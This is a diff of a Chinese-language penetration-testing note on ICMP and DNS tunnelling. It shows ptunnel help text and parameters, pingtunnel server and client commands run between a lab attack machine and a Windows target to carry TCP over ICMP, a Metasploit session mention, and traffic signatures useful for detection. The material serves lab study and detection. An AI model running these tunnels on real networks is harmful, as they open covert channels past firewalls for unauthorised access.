@@ -2,54 +2,21 @@
 
 ## 1. ICMP隧道
 
-### 1.1 pingtunnel
+### 1.1 ptunnel
 
-help信息如下：
+> [Thorsten Alteholz / ptunnel · GitLab (debian.org)](https://salsa.debian.org/alteholz/ptunnel)
 
-```
-ptunnel -h
-ptunnel v 0.72.
-Usage:   ptunnel -p <addr> -lp <port> -da <dest_addr> -dp <dest_port> [-m max_tunnels] [-v verbosity] [-f logfile]
-         ptunnel [-m max_threads] [-v verbosity] [-c <device>]
-     -p: Set address of peer running packet forwarder. This causes
-         ptunnel to operate in forwarding mode - the absence of this
-         option causes ptunnel to operate in proxy mode.
-    -lp: Set TCP listening port (only used when operating in forward mode)
-    -da: Set remote proxy destination address if client
-         Restrict to only this destination address if server
-    -dp: Set remote proxy destionation port if client
-         Restrict to only this destination port if server
-     -m: Set maximum number of concurrent tunnels
-     -v: Verbosity level (-1 to 4, where -1 is no output, and 4 is all output)
-     -c: Enable libpcap on the given device.
-     -f: Specify a file to log to, rather than printing to standard out.
-     -s: Client only. Enables continuous output of statistics (packet loss, etc.)
--daemon: Run in background, the PID will be written in the file supplied as argument
--syslog: Output debug to syslog instead of standard out.
-   -udp: Toggle use of UDP instead of ICMP. Proxy will listen on port 53 (must be root).
-
-Security features:  [-x password] [-u] [-setuid user] [-setgid group] [-chroot dir]
-     -x: Set password (must be same on client and proxy)
-     -u: Run proxy in unprivileged mode. This causes the proxy to forward
-         packets using standard echo requests, instead of crafting custom echo replies.
-         Unprivileged mode will only work on some systems, and is in general less reliable
-         than running in privileged mode.
-         Please consider combining the following three options instead:
--setuid: When started in privileged mode, drop down to user's rights as soon as possible
--setgid: When started in privileged mode, drop down to group's rights as soon as possible
--chroot: When started in privileged mode, restrict file access to the specified directory
--setcon: Set SELinux context when all there is left to do are network I/O operations
-         To combine with -chroot you will have to `mount --bind /proc /chrootdir/proc`
-
-Starting the proxy (needs to run as root):
- [root #] ptunnel
-Starting a client (also needs root):
- [root #] ptunnel -p proxy.pingtunnel.com -lp 8000 -da login.domain.com -dp 22 -c eth0
-And then using the tunnel to ssh to login.domain.com:
- [user $] ssh -p 8000 localhost
-And that's it. Enjoy your tunnel!
+主要参数（ptunnel -h可以查看详细信息）
 
 ```
+-x ：指定ICMP隧道连接的验证密码
+-lp：指定要监听的本地TCP端口
+-da：指定要转发的目标机器的IP地址
+-dp：指定要转发的目标机器的TCP端口
+-p：指定ICMP隧道连一段的IP地址
+```
+
+
 
 #### 上线msf
 
@@ -118,7 +85,7 @@ ln -s libpcap.so.1.5.3 libpcap.so.0.8
 
 上面的session看起来是攻击机的IP，其实ptunnel的server端转发过来的，只是ptunnel的server和msf放在同一个攻击机上而已。
 
-#### ptunnel流量分析
+#### 流量特征
 
 先发送1个长度为70的request，然后又2个长度70的reply(内容固定)，接着就一直发送长度为1096的reply包，每秒为一个周期（可以对比下面两图的时间差）,流量包： [ptunnel_2.pcap](img\Tunnel\ptunnel_2.pcap)  [ptunnel_1.pcap](img\Tunnel\ptunnel_1.pcap) 
 
@@ -126,33 +93,47 @@ ln -s libpcap.so.1.5.3 libpcap.so.0.8
 
 ![image-20231205140103703](./img/Tunnel/image-20231205140103703.png)
 
-### 1.2 icmptunnel
+### 1.2 pingtunnel
 
+#### 转发tcp流量
 
+简单的通过icmp隧道转发tcp流量，攻击机kali-192.168.73.98
 
+```
+./pingtunnel -type server -key 123456
+```
 
+![image-20240109223556139](./img/Tunnel/image-20240109223556139.png)
 
+靶机Win-192.168.1.8
 
+```
+./pingtunnel.exe -type client -l :8888 -s 192.168.73.98 -t 192.168.73.98:7777 -tcp 1 -key 123456
+```
+
+![image-20240109223629232](./img/Tunnel/image-20240109223629232.png)
+
+这样通道就建立起来，192.168.1.8的8888端口收到的tcp流量，都会被转为icmp流量发给server，然后在server端解析成tcp（解析到7777端口）
+
+假如这样把tcp流量发给192.168.1.8的8888
+
+![image-20240109224512073](./img/Tunnel/image-20240109224512073.png)
+
+server端可以收到并解析出来
+
+![image-20240109224633925](./img/Tunnel/image-20240109224633925.png)
+
+#### 流量特征
+
+icmp包长度突然变化，就是有tcp流量要发
+
+![image-20240109230229832](./img/Tunnel/image-20240109230229832.png)
+
+以及突然流量包数量变多
+
+![image-20240109230426359](./img/Tunnel/image-20240109230426359.png)
 
 ## 2. DNS隧道
-
-2.1 DNS隧道原理
-
-原理：配置某个域名的DNS服务器，使得对该域名的所有子域解析请求最终到达该NS服务器上，然后将另一个协议的数据编码为一系列DNS查询，响应时客户端将返回的Response数据进行解码得到另一协议的数据
-
-特征：
-
-DNS隧道建立后依靠不断发送query信息来判断隧道存活性
-通过DNS隧道传输时，客户端将数据编码后作为主机名向DNS服务器提交，DNS服务端解码后读取数据
-检测：
-
-每个IP地址的DNS流量异常，DNS报文数量大
-DNS消息中TXT或NULL等不常用的记录类型多
-DNS消息中域名有部分固定不变
-DNS服务器的地理位置异常
-访问非受信的DNS服务器
-基于请求域名长度及请求频率统计分析方法
-dnscat 查询中包含了dnscat 字符串
 
 ### 2.1 iodine
 
